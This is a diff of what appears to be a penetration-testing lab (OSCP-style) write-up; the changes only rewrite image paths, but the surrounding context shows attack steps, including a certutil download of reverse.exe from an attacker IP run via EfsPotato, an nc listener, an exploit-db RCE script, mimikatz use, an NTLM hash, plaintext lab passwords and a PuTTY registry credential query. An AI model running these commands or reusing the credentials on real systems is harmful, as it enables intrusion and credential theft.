@@ -375,9 +375,9 @@ Then edit where your GPO.ps1 is located and run in power shell
 
 {{< /toggle >}}
 
-![Pasted image 20251215143255.png](Pasted%20image%2020251215143255.png)\
-![Pasted image 20251215144325.png](Pasted%20image%2020251215144325.png)\
-![Pasted image 20251215144402.png](Pasted%20image%2020251215144402.png)
+![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)\
+![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
+![Pasted image 20251215144402.png](/ob/Pasted%20image%2020251215144402.png)
 
 ### WebSite Directory BurteForce
 
@@ -776,9 +776,9 @@ Then edit where your GPO.ps1 is located and run in power shell
 
 Found the http://192.168.208.141:81/db/ with the database hashes, but it is failed
 
-![Pasted image 20251215150836.png](Pasted%20image%2020251215150836.png)
+![Pasted image 20251215150836.png](/ob/Pasted%20image%2020251215150836.png)
 
-![Pasted image 20251215150859.png](Pasted%20image%2020251215150859.png)
+![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)
 
 {{< toggle "Tag 🏷️" >}}
 
@@ -788,7 +788,7 @@ Found the http://192.168.208.141:81/db/ with the database hashes, but it is fail
 
 The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
-![Pasted image 20251215151425.png](Pasted%20image%2020251215151425.png)
+![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)
 
 ```shell
 ─# python3 50801.py  http://192.168.208.141:81                
@@ -805,7 +805,7 @@ The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
 ### mary.williams to admin(SeImpersonatePrivilege)
 
-![Pasted image 20251215152042.png](Pasted%20image%2020251215152042.png)
+![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)
 
 After the admin , use the mimikatz to find more
 
@@ -830,7 +830,7 @@ certutil -urlcache -split -f http://192.168.45.204:8081/reverse.exe C:\ProgramDa
 EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
 ```
 
-![Pasted image 20251215153115.png](Pasted%20image%2020251215153115.png)
+![Pasted image 20251215153115.png](/ob/Pasted%20image%2020251215153115.png)
 
 {{< toggle "Tag 🏷️" >}}
 
@@ -1326,7 +1326,7 @@ mimikatz #
 
 Found the `celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd` and base on that to go the 10.10.168.140
 
-![Pasted image 20251215155631.png](Pasted%20image%2020251215155631.png)
+![Pasted image 20251215155631.png](/ob/Pasted%20image%2020251215155631.png)
 
 ```shell
 ┌──(root㉿kali)-[~/Desktop]
@@ -1371,11 +1371,11 @@ Info: Establishing connection to remote endpoint
 {{< /toggle >}}
 
 Windows old should not be here\
-![Pasted image 20251215160528.png](Pasted%20image%2020251215160528.png)
+![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)
 
-![Pasted image 20251215162641.png](Pasted%20image%2020251215162641.png)
+![Pasted image 20251215162641.png](/ob/Pasted%20image%2020251215162641.png)
 
-![Pasted image 20251215162722.png](Pasted%20image%2020251215162722.png)
+![Pasted image 20251215162722.png](/ob/Pasted%20image%2020251215162722.png)
 
 找到SAM 和 SYSTEM 在一個奇怪的windows old file ，hint :可以透過目期去估那一個是容易被利用
 
@@ -1496,7 +1496,7 @@ help
 version 
 ```
 
-![Pasted image 20260109150533.png](Pasted%20image%2020260109150533.png)
+![Pasted image 20260109150533.png](/ob/Pasted%20image%2020260109150533.png)
 
 ```
 └─# sudo nc -lvnp 80
@@ -1517,7 +1517,7 @@ $
 
 ```
 
-![Pasted image 20260109152811.png](Pasted%20image%2020260109152811.png)
+![Pasted image 20260109152811.png](/ob/Pasted%20image%2020260109152811.png)
 
 ```
 
@@ -1567,7 +1567,7 @@ done
 ```
 
 it appear every 10 sec , so we may use it\
-![Pasted image 20260109153903.png](Pasted%20image%2020260109153903.png)
+![Pasted image 20260109153903.png](/ob/Pasted%20image%2020260109153903.png)
 
 ```
 aero@oscp:/tmp$ ls -al /usr/bin/asinfo
@@ -1580,7 +1580,7 @@ aero
 
 ![Pasted image 20260207144417.png](/ob/Pasted%20image%2020260207144417.png)
 
-![Pasted image 20260109161705.png](Pasted%20image%2020260109161705.png)
+![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
 
 # 192.168.X.144
 
@@ -1699,9 +1699,9 @@ stuart@oscp:~$
 
 # Web Recon 80
 
-![Pasted image 20260114221737.png](Pasted%20image%2020260114221737.png)
+![Pasted image 20260114221737.png](/ob/Pasted%20image%2020260114221737.png)
 
-![Pasted image 20260114221855.png](Pasted%20image%2020260114221855.png)
+![Pasted image 20260114221855.png](/ob/Pasted%20image%2020260114221855.png)
 
 {{< toggle "Tag 🏷️" >}}
 
@@ -1854,7 +1854,7 @@ Date:   Fri Nov 18 17:26:09 2022 +0200
 
 ```
 
-![Pasted image 20260114232631.png](Pasted%20image%2020260114232631.png)
+![Pasted image 20260114232631.png](/ob/Pasted%20image%2020260114232631.png)
 
 > got the account stuart@challenge.lab : BreakingBad92
 
@@ -1940,7 +1940,7 @@ stuart@oscp:~$
 {{< tag "Linux-Privilege-Escalation-backupfile" >}} Found the backup file in the /opt ,hashcat find the password, in the /joomla/configuration.php find the another password\
 {{< /toggle >}}
 
-![Pasted image 20260114234116.png](Pasted%20image%2020260114234116.png)
+![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)
 
 ```
 stuart@oscp:/opt/backup$ ls
@@ -2080,7 +2080,7 @@ Compressed: 25312
 ls /joomla/configuration.php
 ```
 
-![Pasted image 20260115004012.png](Pasted%20image%2020260115004012.png)
+![Pasted image 20260115004012.png](/ob/Pasted%20image%2020260115004012.png)
 
 ```
 stuart@oscp:/opt/backup$ su chloe
@@ -2094,9 +2094,9 @@ chloe@oscp:/opt/backup$ su root
 
 ### chloe to root
 
-![Pasted image 20260115004217.png](Pasted%20image%2020260115004217.png)
+![Pasted image 20260115004217.png](/ob/Pasted%20image%2020260115004217.png)
 
-![Pasted image 20260115004340.png](Pasted%20image%2020260115004340.png)
+![Pasted image 20260115004340.png](/ob/Pasted%20image%2020260115004340.png)
 
 ***
 
@@ -2188,11 +2188,11 @@ Nmap done: 1 IP address (1 host up) scanned in 200.06 seconds
 ```
 ```
 
-![Pasted image 20260115005747.png](Pasted%20image%2020260115005747.png)
+![Pasted image 20260115005747.png](/ob/Pasted%20image%2020260115005747.png)
 
-![Pasted image 20260115010216.png](Pasted%20image%2020260115010216.png)
+![Pasted image 20260115010216.png](/ob/Pasted%20image%2020260115010216.png)
 
-![Pasted image 20260115012444.png](Pasted%20image%2020260115012444.png)
+![Pasted image 20260115012444.png](/ob/Pasted%20image%2020260115012444.png)
 
 ### offsec to admin (Registry Cred leak)
 
@@ -2204,15 +2204,15 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T15
 
 {{< /toggle >}}
 
-![Pasted image 20260115012619.png](Pasted%20image%2020260115012619.png)
+![Pasted image 20260115012619.png](/ob/Pasted%20image%2020260115012619.png)
 
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
 ```
 
-![Pasted image 20260115012704.png](Pasted%20image%2020260115012704.png)\
+![Pasted image 20260115012704.png](/ob/Pasted%20image%2020260115012704.png)\
 zachary:h3R@tC@tch3r
 
-![Pasted image 20260115013001.png](Pasted%20image%2020260115013001.png)
+![Pasted image 20260115013001.png](/ob/Pasted%20image%2020260115013001.png)
 
 ***
